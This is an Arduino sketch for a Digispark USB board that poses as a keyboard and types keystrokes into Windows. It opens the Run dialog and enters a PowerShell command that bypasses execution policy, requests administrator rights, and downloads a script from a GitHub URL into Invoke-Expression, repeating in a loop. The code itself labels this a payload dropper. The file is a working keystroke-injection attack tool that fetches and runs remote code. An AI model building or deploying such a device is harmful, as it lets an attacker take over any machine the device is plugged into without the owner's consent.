#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -ExecutionPolicy Bypass -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-noexit','-command','Invoke-RestMethod -Uri ''https://raw.githubusercontent.com/MelosBucinca/VulnAssess/main/MainCall.ps1'' | Invoke-Expression'\""); //Payload Dropper without saving output and run PowerShell with admin privileges
  DigiKeyboard.delay(500);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}